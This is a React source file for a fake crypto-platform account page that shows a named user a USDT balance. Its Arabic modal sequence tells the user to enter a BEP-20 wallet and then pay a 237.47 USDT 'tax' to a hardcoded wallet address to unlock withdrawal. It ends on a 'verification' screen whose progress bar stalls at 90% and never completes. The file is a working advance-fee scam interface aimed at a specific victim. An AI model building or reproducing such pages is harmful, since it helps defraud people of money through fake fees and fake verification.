
import React, { useState } from 'react';
import { 
  MessageSquare, 
  ChevronRight,
  Home,
  Headphones,
  ShoppingBag,
  CalendarDays,
  User,
  Layout,
  ClipboardCheck,
  CreditCard,
  Settings,
  ArrowUpRight,
  Copy,
  Loader2
} from 'lucide-react';
import { MenuItemProps, NavItemProps } from './types';

// Custom SVG Avatar to match the screenshot's geometric design
const CustomAvatar = () => (
  <div className="w-16 h-16 rounded-full overflow-hidden border-[2.5px] border-white/30 shadow-sm bg-white flex items-center justify-center relative">
    <svg viewBox="0 0 100 100" className="w-full h-full">
      <path d="M50 50 L50 10 L88 38 Z" fill="#FF5555" /> {/* Red */}
      <path d="M50 50 L88 38 L73 85 Z" fill="#FFCC00" /> {/* Yellow */}
      <path d="M50 50 L73 85 L27 85 Z" fill="#9966CC" /> {/* Purple */}
      <path d="M50 50 L27 85 L12 38 Z" fill="#44AAEE" /> {/* Blue */}
      <path d="M50 50 L12 38 L50 10 Z" fill="#66CC66" /> {/* Green */}
    </svg>
  </div>
);

const FeatureItem: React.FC<{ icon: React.ReactNode; label: string }> = ({ icon, label }) => (
  <div className="flex flex-col items-center justify-start space-y-1.5 px-1">
    <div className="w-11 h-11 flex items-center justify-center">
      {icon}
    </div>
    <span className="text-[12px] text-[#333333] font-normal text-center leading-tight whitespace-nowrap">{label}</span>
  </div>
);

const ListItem: React.FC<MenuItemProps> = ({ icon, label }) => (
  <div className="flex items-center justify-between py-[14px] px-4 border-b border-gray-100 last:border-0 active:bg-gray-50">
    <div className="flex items-center space-x-3">
      <div className="text-[#888888]">{icon}</div>
      <span className="text-[14px] text-[#333333] font-normal">{label}</span>
    </div>
    <ChevronRight size={16} className="text-[#CCCCCC]" strokeWidth={2.5} />
  </div>
);

const NavItem: React.FC<NavItemProps> = ({ icon, label, active }) => (
  <div className="flex flex-col items-center justify-center space-y-1 py-1 flex-1 h-full">
    <div className={active ? "text-[#333333]" : "text-[#999999]"}>
      {icon}
    </div>
    <span className={`text-[12px] ${active ? "text-[#333333] font-medium" : "text-[#999999]"}`}>{label}</span>
  </div>
);

const App: React.FC = () => {
  const [modalStep, setModalStep] = useState(1);
  const [walletAddress, setWalletAddress] = useState('');

  const nextStep = () => setModalStep(prev => prev + 1);

  return (
    <div className="relative min-h-screen bg-[#F8F9FB] overflow-x-hidden">
      {/* Main Content with conditional Blur - Reduced from 5px to 2px */}
      <div className={`main-container transition-all duration-300 ${modalStep > 0 && modalStep < 5 ? 'blur-[2px] pointer-events-none' : ''}`}>
        {/* Header Section */}
        <div className="bg-gradient-to-r from-[#9B4A4E] to-[#7C4A50] pt-14 pb-14 px-5 relative overflow-hidden">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <CustomAvatar />
              <div className="flex flex-col space-y-1">
                <div className="flex items-center space-x-2">
                  <h1 className="text-white text-[22px] font-bold tracking-tight">yamen 1992</h1>
                  <span className="bg-[#F5B400] text-white text-[9px] font-bold px-1.5 py-0.5 rounded-[5px] italic border border-white/20">VIP0</span>
                </div>
                <p className="text-white/90 text-[13px] font-normal">Invitation code: 804461</p>
              </div>
            </div>
            <button className="text-white self-start mt-1">
              <div className="w-8 h-8 rounded-full border border-white/20 flex items-center justify-center">
                 <MessageSquare size={18} fill="currentColor" fillOpacity={0.2} />
              </div>
            </button>
          </div>

          <div className="mt-8 flex items-center justify-between">
            <div className="flex flex-col">
              <h2 className="text-white text-[14px] font-medium opacity-100">My Account</h2>
              <div className="flex items-center space-x-1.5 mt-1">
                <span className="text-white/90 text-[13px] font-medium">USDT</span>
                <span className="text-white text-[22px] font-bold leading-none">2733.0023</span>
              </div>
            </div>
            <div className="flex space-x-4 pr-1">
              <div className="flex flex-col items-center space-y-1.5">
                <button className="w-[54px] h-[54px] bg-[#F5F5F5] rounded-[18px] flex items-center justify-center shadow-lg">
                  <div className="w-[32px] h-[32px] rounded-lg bg-gradient-to-b from-[#1F6AE1] to-[#0B4DB8] flex items-center justify-center text-white relative">
                     <div className="absolute top-1 left-1.5 w-4 h-3 bg-white/20 rounded-sm"></div>
                     <div className="w-4 h-4 rounded-full border-2 border-white/80 flex items-center justify-center">
                       <div className="w-1 h-1 bg-white rounded-full"></div>
                     </div>
                  </div>
                </button>
                <span className="text-white text-[11px] font-medium">Deposit</span>
              </div>
              <div className="flex flex-col items-center space-y-1.5">
                <button className="w-[54px] h-[54px] bg-[#F5F5F5] rounded-[18px] flex items-center justify-center shadow-lg">
                  <div className="w-[32px] h-[32px] rounded-lg bg-gradient-to-b from-[#1F6AE1] to-[#0B4DB8] flex items-center justify-center text-white">
                    <CreditCard size={18} strokeWidth={2.5} />
                  </div>
                </button>
                <span className="text-white text-[11px] font-medium">Withdrawal</span>
              </div>
            </div>
          </div>
        </div>

        {/* Feature Icons Row */}
        <div className="bg-white py-6 grid grid-cols-4 gap-0 border-b border-gray-100">
          <FeatureItem label="Teams" icon={<div className="w-10 h-10 bg-[#FFF4E6] rounded-full flex items-center justify-center"><User size={24} fill="#F97316" color="#F97316" /></div>} />
          <FeatureItem label="Record" icon={<div className="w-10 h-10 bg-[#E6FAF4] rounded-full flex items-center justify-center"><Layout size={24} fill="#10B981" color="#10B981" /></div>} />
          <FeatureItem label="Wallet management" icon={<div className="w-10 h-10 bg-[#FFEBEB] rounded-full flex items-center justify-center relative"><div className="w-7 h-7 bg-[#EF4444] rounded-full flex items-center justify-center"><ArrowUpRight size={14} color="white" strokeWidth={3} /></div></div>} />
          <FeatureItem label="Invite friends" icon={<div className="w-10 h-10 bg-[#E6F0FF] rounded-full flex items-center justify-center"><div className="w-7 h-5 bg-[#3B82F6] rounded-[4px] relative flex items-center justify-center"><div className="w-2 h-2 bg-white rounded-full"></div></div></div>} />
        </div>

        {/* Menu List Section */}
        <div className="px-4 mt-5">
          <div className="bg-white rounded-[12px] shadow-sm overflow-hidden border border-gray-100">
            <ListItem icon={<Layout size={20} />} label="Profile" />
            <ListItem icon={<ClipboardCheck size={20} />} label="Deposit records" />
            <ListItem icon={<CalendarDays size={20} />} label="Withdrawal records" />
            <ListItem icon={<Settings size={20} />} label="Setting" />
          </div>
        </div>

        {/* Bottom Navigation */}
        <div className="fixed bottom-0 left-0 right-0 max-w-[430px] mx-auto bg-white border-t border-gray-100 flex items-center justify-around h-[72px] px-1 z-50">
          <NavItem icon={<Home size={22} />} label="Home" />
          <NavItem icon={<Headphones size={22} />} label="Service" />
          <NavItem icon={<ShoppingBag size={22} />} label="Menu" />
          <NavItem icon={<CalendarDays size={22} />} label="Record" />
          <NavItem icon={<User size={22} />} label="Mine" active={true} />
        </div>
      </div>

      {/* Modal Overlay System */}
      {modalStep > 0 && modalStep < 5 && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center px-6 bg-black/40 backdrop-blur-[1px]">
          <div className="bg-white w-full max-w-[340px] rounded-[24px] shadow-2xl p-6 flex flex-col items-center text-center animate-in fade-in zoom-in duration-300">
            
            {/* Step 1: Welcome */}
            {modalStep === 1 && (
              <div dir="rtl" className="space-y-4">
                <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto">
                   <User className="text-blue-600" size={32} />
                </div>
                <h3 className="text-[18px] font-bold text-gray-900 leading-snug">
                  أهلاً بك yamen 1992
                </h3>
                <p className="text-[14px] text-gray-600 leading-relaxed">
                  تم حل أمر المهام، اضغط التالي. <br/>
                  <span className="font-semibold text-red-500 underline">لا تقم بمشاركة هذا العنوان لأي شخص.</span>
                </p>
                <button 
                  onClick={nextStep}
                  className="w-full bg-[#1F6AE1] text-white py-3.5 rounded-[14px] font-bold text-[15px] active:scale-95 transition-transform"
                >
                  التالي
                </button>
              </div>
            )}

            {/* Step 2: Wallet Input */}
            {modalStep === 2 && (
              <div dir="rtl" className="w-full space-y-4">
                <h3 className="text-[17px] font-bold text-gray-900">إدخال عنوان المحفظة</h3>
                <p className="text-[13px] text-gray-500">الرجاء وضع رابط محفظة BEP-20 الخاصة بك</p>
                <input 
                  type="text"
                  placeholder="0x..."
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  className="w-full bg-gray-50 border border-gray-200 rounded-[12px] px-4 py-3 text-[14px] outline-none focus:ring-2 focus:ring-blue-500/20"
                />
                <button 
                  onClick={nextStep}
                  disabled={!walletAddress}
                  className={`w-full py-3.5 rounded-[14px] font-bold text-[15px] transition-all ${walletAddress ? 'bg-[#1F6AE1] text-white shadow-lg' : 'bg-gray-200 text-gray-400 cursor-not-allowed'}`}
                >
                  التالي
                </button>
              </div>
            )}

            {/* Step 3: Payment Info */}
            {modalStep === 3 && (
              <div dir="rtl" className="space-y-4">
                <h3 className="text-[17px] font-bold text-gray-900">تنبيه إيداع الضريبة</h3>
                <div className="text-[13px] text-gray-600 text-right leading-relaxed bg-blue-50 p-4 rounded-[16px]">
                  أهلاً بك <span className="font-bold">yamen 1992</span>، بقي أمر إيداع مبلغ <span className="font-bold text-blue-700">237.47 USDT BEP-20</span> لفتح قناة السحب.
                  <p className="mt-2 text-[12px] text-gray-500 italic border-t border-blue-100 pt-2">
                    هذه الضريبة هي أجور منصتنا وليس لها أي صلة بمنصة mini pro. يمكنك السحب فوراً عند دفع الضريبة.
                  </p>
                </div>
                
                <div className="w-full space-y-2 mt-2">
                   <p className="text-[11px] text-gray-400 text-right pr-1">رابط المحفظة (اضغط للنسخ)</p>
                   <div 
                    onClick={() => navigator.clipboard.writeText('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d')}
                    className="flex items-center justify-between bg-gray-100 p-3 rounded-[12px] cursor-pointer hover:bg-gray-200 transition-colors"
                   >
                     <span className="text-[11px] font-mono text-gray-600 truncate mr-2">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</span>
                     <Copy size={14} className="text-gray-400 flex-shrink-0" />
                   </div>
                </div>

                <button 
                  onClick={nextStep}
                  className="w-full bg-[#1F6AE1] text-white py-3.5 rounded-[14px] font-bold text-[15px] shadow-lg shadow-blue-500/20"
                >
                  تم الإيداع
                </button>
              </div>
            )}

            {/* Step 4: Verification */}
            {modalStep === 4 && (
              <div dir="rtl" className="space-y-5 py-2">
                <div className="flex justify-center">
                   <Loader2 className="animate-spin text-blue-600" size={40} />
                </div>
                <h3 className="text-[17px] font-bold text-gray-900">جاري التحقق...</h3>
                <p className="text-[14px] text-gray-600">
                  الرجاء الانتظار للتأكد من عملية الإيداع وتحديث حالة السحب الخاصة بك.
                </p>
                <div className="w-full h-1.5 bg-gray-100 rounded-full overflow-hidden">
                  <div className="h-full bg-blue-600 animate-progress"></div>
                </div>
              </div>
            )}

          </div>
        </div>
      )}

      {/* Global CSS for progress animation */}
      <style>{`
        @keyframes progress {
          0% { width: 0%; }
          100% { width: 90%; }
        }
        .animate-progress {
          animation: progress 15s ease-out forwards;
        }
      `}</style>
    </div>
  );
};

export default App;
